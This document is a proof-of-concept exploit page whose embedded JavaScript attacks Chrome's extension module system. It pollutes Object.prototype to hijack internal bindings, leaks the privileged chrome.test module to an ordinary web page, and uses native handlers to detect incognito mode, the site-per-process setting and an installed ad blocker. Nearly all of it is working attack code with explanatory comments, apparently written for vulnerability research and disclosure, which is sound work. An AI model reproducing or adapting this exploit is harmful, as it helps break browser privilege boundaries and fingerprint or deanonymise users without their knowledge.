 This PoC shows how the extension module system can be leaked to a web page. As an example, it shows:
<ul>
    <li> Whether --site-per-process is enabled.
        <li> Whether you're in incognito mode.
            <li> Whether AdBlock Plus is installed.
</ul>

<script>

    'use strict';
    // MODULE_TO_LEAK can be anything that is declared in Dispatcher::GetJsResources
    // and ChromeExtensionsDispatcherDelegate::PopulateSourceMap
    // Sources are:
    // - extensions/renderer/resources/
    // - chrome/renderer/resources/extensions/
    // The only APIs that can be used are:
    // - APIs exposed via requireNative - *{native_handler,custom_binding}*.cc
    // - extensions/common/api/_api_features.json
    // - chrome/common/extensions/api/_api_features.json
    var MODULE_TO_LEAK = 'test'; // chrome.test is very juicy :)

    // We use this key to detect whether the scheme override was successful.
    var SOME_ARBITRARY_VALUE = 'whatever';

    stealModule(function (testCustomBindings) {
        var chrome_test = testCustomBindings.binding;
        window.test = chrome_test;
        console.log('Got chrome.test: ', chrome_test);
        // runWithNativesEnabled is locked down. But the callback is called in the scope where
        // natives are enabled, so we don't need to call runWithNativesEnabled to use it again.
        // See the useLeak call far below.
        //chrome_test.runWithNativesEnabled(function() {
        var module_system = chrome_test.getModuleSystem(window);
        var process = module_system.requireNative('process');
        var i18n = module_system.requireNative('i18n');
        var msg = `
--site-per-process    : ${process.HasSwitch('site-per-process')}
Incognito             : ${process.InIncognitoContext()}
AdBlock Plus installed: ${!!i18n.GetL10nMessage('name', null, 'cfhdojbkjhnklbpkdaibdccddilifddb')}`;
        console.log(msg);
        alert(msg);
        //});
    });

    function defineImports(schema, modulename) {
        // Re-using lastError because it will pass the availability check.
        schema.properties.lastError = {
            $ref: SOME_ARBITRARY_VALUE,
            // Parameters to the noop function defined below.
            // Used in binding.js, as args in $Function.apply(constructor, value, args);
            value: [],
        };
        schema.types.unshift({
            id: SOME_ARBITRARY_VALUE,
            // Skip the type export in the schema.types branch, we don't need it.
            platforms: [],
            // Will be require-d by createCustomType
            // Normally, it is not possible to import most modules, because most of them
            // make use of requireNative, which throws an error if run from an unprivileged
            // context (= with natives disabled).
            // But we trick Chrome into loading the module, so this will work!
            js_module: modulename,
            // functions is defined because createCustomType in binding.js expects it, via.
            //   customType.prototype.setSchema(type);
            functions: [],
        });
    }

    // Call this function to leak the module.
    function stealModule(useLeak) {
        var shouldReload = false;

        // Hook on the creation of Binding and modify the schema.
        //
        // Binding.create = function(apiName) {
        //   return new Binding(apiName);
        // };
        Object.defineProperty(Object.prototype, 'create', {
            configurable: true,
            get() {
                // customHooks_ has no value by default.
            },
            set(Binding_create) {
                if (typeof this !== 'function' ||
                    typeof Binding_create !== 'function' ||
                    !this.toString().includes('customHooks_')) {
                    // Not Binding.create, transparently create the property.
                    Object.defineProperty(this, 'create', {
                        configurable: true,
                        enumerable: true,
                        value: Binding_create,
                    });
                    return;
                }

                Object.defineProperties(this, {
                    create: {
                        enumerable: true,
                        value: function FakeBinding(apiName) {
                            var binding = Binding_create(apiName);
                            var runHooks_ = binding.runHooks_;
                            // This is our evil stuff. The runHooks_ method gets a reference to the schema.
                            binding.runHooks_ = function (mod, schema) {
                                if (!schema) {
                                    // For Chrome 49-.
                                    schema = this.schema_;
                                }

                                if (schema.namespace === 'runtime' && schema.types &&
                                    schema.types[0].id !== SOME_ARBITRARY_VALUE) {
                                    defineImports(schema, MODULE_TO_LEAK);
                                    shouldReload = true;
                                    return;
                                }
                                return runHooks_.call(this, mod, schema);
                            };
                            return binding;
                        },
                    },
                });
            },
        });
        Object.defineProperty(Object.prototype, 'is_available', {
            get() { return true; }, // The API is always available.
            set() { }, // Ignore setters. We don't want it to be set to |false|.
        });

        var leaked;
        defineModuleStealer(function (exports) {
            leaked = exports;
            // We are still under the scope with natives enabled. Use the leaked module
            // now because it is not easy to use it later.
            useLeak(exports);
        });

        // Trigger the lazy module system.
        chrome.runtime;

        // Clean-up.
        delete Object.prototype.customHooks_;

        // At the first run, the page should reload.
        if (shouldReload) {
            // It is probably safe to reload above, but I'm reloading only after the module loading
            // has finalized to avoid side effects.
            location.reload();
            return;
        }

        // After the first run, we have our module.

        console.assert(leaked !== void 0, 'Should have leaked: ' + MODULE_TO_LEAK);
        // Can't use it here because runWithNativesEnabled is now disabled.
        // useLeak(leaked);
    }

    // leakModule will receive the leaked module.
    function defineModuleStealer(leakModule) {
        Object.defineProperties(Object.prototype, {
            [MODULE_TO_LEAK]: {
                set(value) {
                    if (typeof value === 'object' && value !== null &&
                        Object.keys(value).length === 0 && Object.keys(this).length === 0) {
                        // This is the module that we requested :)
                        Object.defineProperty(this, MODULE_TO_LEAK, {
                            enumerable: true,
                            writable: true,
                            value: value,
                        });
                        // This is called in binding.generate:
                        // for (var index = 0, name; name = namespaces[index]; index++) {
                        //      mod[name] = mod[name] || {};
                        //      ^^^^^^^^^^^

                        value.ROBS_DUMMY = true;
                        // The purpose of setting the above key is to make sure that at the end of
                        // binding.generate(), success === true.
                    }
                },
                get() {
                    // In Chrome 49 and before, this getter was called twice and leaked the module
                    // system (and also the imported module).
                    //
                    // In Chrome 50, this is fixed. We still keep the getter so that this exploit can
                    // be used with both Chrome 49 and 50.
                    Object.defineProperty(Object.prototype, MODULE_TO_LEAK, {
                        configurable: true,
                        get() {
                            if ('$set' in this) {
                                delete Object.prototype[MODULE_TO_LEAK];
                                delete Object.prototype.name;
                                leakModule(this);
                                return function noop() { };
                            }
                        }
                    });
                },
                configurable: true,
            },

            // This part allows non-whitelisted methods to become visible.
            // This only works if the actual functionality is only implemented in JS or via native
            // bindings, because most of the calls that go through the browser is validated against
            // the JSON schema / IDL.
            // chrome.test is almost completely implemented in native bindings and JS, so... :)
            'name': {
                configurable: true,
                get() { },
                set(value) {
                    // Designed to skip over the if in the following block:
                    //        var apiFunction = {};
                    //        apiFunction.definition = functionDef;
                    //        apiFunction.name = schema.namespace + '.' + functionDef.name;
                    //
                    //        if (!GetAvailability(apiFunction.name).is_available ||
                    //            (checkUnprivileged && !isSchemaAccessAllowed(functionDef))) {
                    //          this.apiFunctions_.registerUnavailable(functionDef.name);
                    //          return;
                    //        }

                    var keys = Object.keys(this);
                    if (keys.length === 1 && keys[0] === 'definition' &&
                        typeof value === 'string' && value.startsWith(MODULE_TO_LEAK)) {
                        Object.defineProperty(this, 'name', {
                            configurable: true,
                            get() {
                                Object.defineProperty(this, 'name', {
                                    configurable: true,
                                    enumerable: true,
                                    writable: true,
                                    value: value
                                });
                                // This is always available.
                                return 'runtime.lastError';
                            },
                        });
                        return;
                    }
                    Object.defineProperty(this, 'name', {
                        configurable: true,
                        enumerable: true,
                        writable: true,
                        value: value
                    });
                },
            },
        });
    }
</script>